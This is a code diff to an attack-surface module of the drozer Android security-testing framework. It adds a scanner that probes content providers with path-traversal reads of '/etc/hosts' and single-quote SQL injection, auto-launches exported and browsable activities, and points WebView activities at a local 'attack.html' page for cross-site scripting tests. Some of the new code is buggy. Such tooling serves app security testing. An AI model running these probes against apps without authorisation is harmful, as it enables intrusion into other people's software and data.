@@ -1,9 +1,12 @@
+#-*- coding: UTF-8 -*-
 import re
-
+from PyQt4 import QtGui
+import xml.etree.ElementTree as ET
 from drozer import android
 from drozer.modules import common, Module
-class AttackSurface(Module, common.BusyBox, common.Shell, common.SuperUser, common.Filters, common.PackageManager, common.IntentFilter, common.ClassLoader,
-                  ):
+from pydiesel.reflection import ReflectionException
+
+class AttackSurface(Module, common.BusyBox, common.Shell, common.SuperUser, common.Filters, common.IntentFilter, common.PackageManager,common.Provider, common.ZipFile, common.Strings):
     name = "Get attack surface of package"
     description = "Examine the attack surface of an installed package."
     examples = """Finding the attack surface of the built-in browser
@@ -31,11 +34,26 @@ class AttackSurface(Module, common.BusyBox, common.Shell, common.SuperUser, comm
     def add_arguments(self, parser):
         parser.add_argument("package", help="the identifier of the package to inspect")
 
-    def execute(self, arguments):
+    def testcontext(self):
+        context= self.getContext().getClass().getDeclaredMethods()
+
+        print
+
+    def execute(self, arguments, myui):
+        self.ui = myui
+        """
+        :param arguments:
+        :return
+        """
+        # self.testcontext()
+
+
         if arguments.package != None:
             package = self.packageManager().getPackageInfo(arguments.package,
                                                            common.PackageManager.GET_ACTIVITIES | common.PackageManager.GET_RECEIVERS | common.PackageManager.GET_PROVIDERS | common.PackageManager.GET_SERVICES)
             application = package.applicationInfo
+
+            self.attackable_package_name= package.packageName
             if (application.flags & application.FLAG_DEBUGGABLE) != 0:
                 self.debuggable = True
 
@@ -47,7 +65,6 @@ class AttackSurface(Module, common.BusyBox, common.Shell, common.SuperUser, comm
             activities = self.match_filter(package.activities, 'exported', True)
             receivers = self.match_filter(package.receivers, 'exported', True)
             services = self.match_filter(package.services, 'exported', True)
-
             providers = self.match_filter(package.providers, 'authority', True)
             r_providers = self.match_filter(providers, 'readPermission', True)
             w_providers = self.match_filter(providers, 'writePermission', True)
@@ -63,30 +80,42 @@ class AttackSurface(Module, common.BusyBox, common.Shell, common.SuperUser, comm
 
 
 
-            # self.scanComponents(package)
+            self.scanComponents(package)
             # self.scanNatives(package)
-            self.scanWorldRWFiles(application)
-
+            # self.scanWorldRWFiles(application)
+            # self.scan_vulnerable_uris(self.attackable_package_name)
+            self.scan_webview()
             '''
             added
             '''
 
-
-            # self.stdout.write("Attack Surface:\n")
-            # self.stdout.write("  %d activities exported\n" % len(activities))
-            # self.stdout.write("  %d broadcast receivers exported\n" % len(receivers))
-            # self.stdout.write("  %d content providers exported\n" % len(providers))
-            # self.stdout.write("  %d services exported\n" % len(services))
-
-
-
         else:
             self.stdout.write("No package specified\n")
 
+    def findBrowserableActivity(self, package):
+        names1 = []
+        names2= []
+        manifest = self.getAndroidManifest(package)
+        root = ET.fromstring(manifest)
+        for activity in root.find('application').findall('activity'):
+            for intentfilter in activity.findall('intent-filter'):
+                foundBrowsable = False
+                category = intentfilter.findall('category')
+                for cat in category:
+                    if cat.get('name') == "android.intent.category.BROWSABLE":
+                        foundBrowsable = True
+                if foundBrowsable:
+                    name = activity.get('name')
+                    if not name in names1:
+                        names1.append(name)
+        for activity in self.attackable_activities:
+            if (activity.name in names1) and (not activity.name in names2):
+                names2.append(activity)
+
+        return names2
 
     def scanComponents(self, package):
         sql = "insert into exported_activities values('"
-        self.attackable_package_name = package.packageName
 
         '''
         scan attack_activities
@@ -99,6 +128,7 @@ class AttackSurface(Module, common.BusyBox, common.Shell, common.SuperUser, comm
                                          % (self.attackable_package_name, attack_activity.name)
                     )
                     for intent_filter in intent_filters:
+                        self.startWithIntent(attack_activity,intent_filter)
                         self.insert_with_intent(attack_activity, intent_filter, 'activity_intent')
                 else:
                     self.sqlstdout.write("insert into exported_activities values('%s','%s',0);"
@@ -106,6 +136,8 @@ class AttackSurface(Module, common.BusyBox, common.Shell, common.SuperUser, comm
                     )
                     # self.startWithNull(attack_activity)
 
+        self.ui.progressBar.setProperty("value", 25)
+        QtGui.QApplication.processEvents()
         '''
         scan attack_services
         '''
@@ -122,7 +154,8 @@ class AttackSurface(Module, common.BusyBox, common.Shell, common.SuperUser, comm
                     self.sqlstdout.write("insert into exported_services values('%s','%s',0);"
                                          % (self.attackable_package_name, attack_service.name)
                     )
-
+        self.ui.progressBar.setProperty("value", 50)
+        QtGui.QApplication.processEvents()
         '''
         scan exported_receivers
         '''
@@ -139,6 +172,8 @@ class AttackSurface(Module, common.BusyBox, common.Shell, common.SuperUser, comm
                     self.sqlstdout.write("insert into exported_receivers values('%s','%s',0);"
                                          % (self.attackable_package_name, attack_receiver.name)
                     )
+        self.ui.progressBar.setProperty("value", 75)
+        QtGui.QApplication.processEvents()
         '''
         scan exported_providers
         '''
@@ -147,8 +182,59 @@ class AttackSurface(Module, common.BusyBox, common.Shell, common.SuperUser, comm
                 self.sqlstdout.write("insert into exported_providers values('%s','%s');"
                                      % (self.attackable_package_name, attack_provider.name)
                 )
-                self.insert_provider(attack_provider)
+                self.scan_exported_provider(attack_provider)
+        self.ui.progressBar.setProperty("value", 100)
+        QtGui.QApplication.processEvents()
 
+    def scan_vulnerable_uris(self, package):
+        """
+        find uris in the given package that can be injected and traveraled
+        :param package: string ==package.packageName
+        :var sql1 traversal sql
+        :var sql2 injection sql
+        """
+        sql1 = ""
+
+        vulnerable_uris = {"traversal_uris": [], "injection_uris": []}
+        for uri in self.findAllContentUris(package):
+            """
+             traversal
+             """
+            try:
+                data = self.contentResolver().read(uri + "/../../../../../../../../../../../../../../../../etc/hosts")
+            except ReflectionException as e:
+                if e.message.find("java.io.FileNotFoundException") >= 0 or \
+                                e.message.find("java.lang.IllegalArgumentException") >= 0 or \
+                                e.message.find("java.lang.SecurityException") >= 0 or \
+                                e.message.find("No content provider") >= 0 or \
+                        e.message.find("RuntimeException"):
+                    data = ""
+                else:
+                    raise
+            if data != None and len(data) > 0:
+                vulnerable_uris["traversal_uris"].add(uri)
+
+            """
+            injection
+            """
+            try:
+                self.contentResolver().query(uri, projection=["'"])
+            except ReflectionException as e:
+                if e.message.find("unrecognized token") >= 0:
+                    vulnerable_uris["injection_uris"].add(uri)
+
+            try:
+                self.contentResolver().query(uri, selection="'")
+            except ReflectionException as e:
+                if e.message.find("unrecognized token") >= 0:
+                    vulnerable_uris["injection_uris"].add(uri)
+
+            if 0 != len(vulnerable_uris["traversal_uris"]):
+                for traversal_uri in vulnerable_uris["traversal_uris"]:
+                    self.sqlstdout.write("insert into traversal_uris values('%s', '%s');" % (package, traversal_uri))
+            if 0 != len(vulnerable_uris["injection_uris"]):
+                for injection_uri in vulnerable_uris["injection_uris"]:
+                    self.sqlstdout.write("insert into injection_uris values('%s', '%s');" % (package, injection_uri))
 
     def scanNatives(self, package):
         Native = self.loadClass("common/Native.apk", "Native")
@@ -179,7 +265,6 @@ class AttackSurface(Module, common.BusyBox, common.Shell, common.SuperUser, comm
                 for f in readable_files:
                     self.stdout.write("  %s\n" % f)
 
-
             command = self.busyboxPath() + " find %s \( -type b -o -type c -o -type f -o -type s \) -perm -o=w \-exec ls {} \;" % DataDir
             command = self.suPath() + " -c \"%s\"" % command
             files = self.shellExec(command)
@@ -195,9 +280,9 @@ class AttackSurface(Module, common.BusyBox, common.Shell, common.SuperUser, comm
         else:
             self.stderr.write("This command requires BusyBox to complete. Run tools.setup.busybox and then retry.\n")
 
-    def insert_provider(self, provider):
+    def scan_exported_provider(self, provider):
         PatternMatcherTypes = {0: "PATTERN_LITERAL", 1: "PATTERN_PREFIX", 2: "PATTERN_SIMPLE_GLOB"}
-        sqlsentence = "insert into provider_info values('%s','%b','b','%s','b','%s','%b','%b');"
+        sqlsentence = "insert into provider_info values('%s','%b','%b','%s','%b','%s','%b','%b');"
         read_permission = provider.readPermission
         write_permission = provider.writePermission
         authority = provider.authority
@@ -207,10 +292,10 @@ class AttackSurface(Module, common.BusyBox, common.Shell, common.SuperUser, comm
         if provider.uriPermissionPatterns != None:
             uri_permission_patterns = True
             for pattern in provider.uriPermissionPatterns:
-                path = pattern.getPath()
-                type = PatternMatcherTypes[int(pattern.getType())]
+                uri_path = pattern.getPath()
+                uri_type = PatternMatcherTypes[int(pattern.getType())]
                 self.sqlstdout.write("insert into uri_permission_patterns values('%s','%s','%s')"
-                                     % (provider_name, path, type)
+                                     % (provider_name, uri_path, uri_type)
                 )
         else:
             uri_permission_patterns = False
@@ -218,13 +303,13 @@ class AttackSurface(Module, common.BusyBox, common.Shell, common.SuperUser, comm
             path_permission = True
             for permission in provider.pathPermissions:
                 path = permission.getPath()
-                type = PatternMatcherTypes[int(permission.getType())]
-                read_permission = permission.getReadPermission()
-                write_permission = permission.getWritePermission()
+                path_type = PatternMatcherTypes[int(permission.getType())]
+                path_read_permission = permission.getReadPermission()
+                path_write_permission = permission.getWritePermission()
                 self.sqlstdout.write("insert into path_permission values('%s','%s','%s','%s','%s')"
-                                     % (provider_name, path, type, read_permission, write_permission))
+                                     % (provider_name, path, path_type, path_read_permission, path_write_permission))
         else:
-            pth_permission = False
+            path_permission = False
 
         self.sqlstdout.write(sqlsentence % (provider_name,
                                             read_permission,
@@ -244,25 +329,73 @@ class AttackSurface(Module, common.BusyBox, common.Shell, common.SuperUser, comm
         if len(intent_filter.actions) > 0:
             for action in intent_filter.actions:
                 insert_action = action
-                if len(intent_filter.categories) > 0:
-                    for category in intent_filter.categories:
-                        insert_category = category
-                        if len(intent_filter.datas) > 0:
-                            for data in intent_filter.datas:
-                                insert_data = data
-                                self.sqlstdout.write(
-                                    insert_sentence % (component.name, insert_action, insert_category, insert_data))
-                        else:
-                            self.sqlstdout.write(
-                                insert_sentence % (component.name, insert_action, insert_category, insert_data))
-                else:
-                    self.sqlstdout.write(
-                        insert_sentence % (component.name, insert_action, insert_category, insert_data))
+                if self.check_action(action):
+                    if len(intent_filter.categories) > 0:
+                        for category in intent_filter.categories:
+                            insert_category = category
+                            if self.check_category(category):
+                                if len(intent_filter.datas) > 0:
+                                    for data in intent_filter.datas:
+                                        insert_data = data
+                                        self.sqlstdout.write(
+                                            insert_sentence % (component.name, insert_action, insert_category, insert_data))
+                                else:
+                                    self.sqlstdout.write(
+                                        insert_sentence % (component.name, insert_action, insert_category, insert_data))
+                    else:
+                        self.sqlstdout.write(
+                            insert_sentence % (component.name, insert_action, insert_category, insert_data))
+
+    def scan_webview(self):
+        web_activities = self.findBrowserableActivity(self.attackable_package_name)
+        for web_activity in web_activities:
+            intent_filters = self.find_intent_filters(web_activity, 'activity')
+            if len(intent_filters)>0:
+                '''
+                     建立intent_set 避免重复启用某一个activity
+                '''
+                intent_set = []
+                for intent_filter in intent_filters:
+                    # self.startWithIntent(web_activity, intent_filter)
+
+                    intent = self.new("android.content.Intent")
+                    comp = (self.attackable_package_name, web_activity.name)
+                    com = self.new("android.content.ComponentName", *comp)
+                    if len(intent_filter.actions) > 0:
+                        for action in intent_filter.actions:
+                            if action != '' and action != "android.intent.action.MAIN" and (action in android.Intent.actions):
+                                intent.setAction(action)
+                                intent.setComponent(com)
+                                if len(intent_filter.categories) > 0:
+                                    for category in intent_filter.categories:
+                                        if category == "android.intent.category.BROWSABLE":
+                                            intent.addCategory(category)
+
+                                            if len(intent_filter.datas) > 0:
+                                                for data in intent_filter.datas:
+                                                    if "http" == data.scheme:
+                                                        if not [web_activity.name, action, category] in intent_set:
+                                                            intent_set.append([web_activity.name, action, category])
+
+                                                            # data = "http://uxss.sinaapp.com/index.php"
+                                                            data = "file:///sdcard/data-app/attack.html"
+                                                            # data = "10.199.157.32:82//attack.html"
+                                                            uri = self.klass("android.net.Uri")
+                                                            intent.setData(uri.parse(data))
+                                                            intent.setFlags(0x10000000)
+                                                            context = self.getContext()
 
 
-    # def insert_provider(self, provider):
-
-
+                                                            print "name:", web_activity.name
+                                                            print "action: ", action
+                                                            print "data:" , data
+                                                            print "category:",category
+                                                            try:
+                                                                 context.startActivity(intent)
+                                                            except:
+                                                                print "err"
+                                                            # context.onStop()
+                                                            # context.stopActivity(intent)
 
 
 
@@ -274,29 +407,32 @@ class AttackSurface(Module, common.BusyBox, common.Shell, common.SuperUser, comm
             com = self.new("android.content.ComponentName", *comp)
             if len(intent_filter.actions) > 0:
                 for action in intent_filter.actions:
-                    if action != '' and action != "android.intent.action.MAIN":
+                    if self.check_action(action):
                         intent.setAction(action)
                         intent.setComponent(com)
                         if len(intent_filter.categories) > 0:
                             for category in intent_filter.categories:
-                                intent.addCategory(category)
-
-                                if len(intent_filter.datas) > 0:
-                                    for data in intent_filter.datas:
-                                        data = "www.baidu.com"
-                                        uri = self.klass("android.net.Uri")
-                                        intent.setData(uri.parse(data))
-                                        intent.setFlags(0x10000000)
-                                        self.stdout.write('''
-                                        action....%s
-                                        category...%s
-                                        data...%s
-                                         '''
-                                                          % (action, category, data))
-                                        self.getContext().startActivity(intent)
-                                        self.stdout.write("start successfully")
+                                if self.check_category(category):
+                                    intent.addCategory(category)
+                                    # if len(intent_filter.datas) > 0:
+                                        # for data in intent_filter.datas:
+                                        #     data = "http://uxss.sinaapp.com/index.php"
+                                        #     uri = self.klass("android.net.Uri")
+                                        #     intent.setData(uri.parse(data))
+                                        #     intent.setFlags(0x10000000)
+                                        #     self.stdout.write('''
+                                        #     action:....%s
+                                        #     category:...%s
+                                        #     data:...%s
+                                        #      '''
+                                        #      % (action, category, data))
+                                        #     context = self.getContext()
+                                        #     result = context.startActivity(intent)
+                                        #     self.stdout.write("start successfully")
+                                    intent.setFlags(0x10000000)
+                                    self.getContext().startActivity(intent)
         except Exception:
-            self.stdout.write("start %s with action :%s error" % (compment.name, action))
+            self.stdout.write("start %s with action :%s error" % (compment.name, action.name))
 
 
     def startWithNull(self, compment):
@@ -311,6 +447,16 @@ class AttackSurface(Module, common.BusyBox, common.Shell, common.SuperUser, comm
 
         except Exception:
             self.stdout.write("trying start %s....ERROR" % (compment.name))
+            """
+            check action and category
+            """
+    def check_action(self, action):
+        if (action in android.Intent.actions) and (action != None) and (action != "android.intent.action.MAIN"):
+            return True
+    def check_category(self, category):
+        if category in android.Intent.categories:
+            return True
+
 
 class Info(Module, common.Filters, common.PackageManager, common.IntentFilter):
     name = "Get information about installed packages"
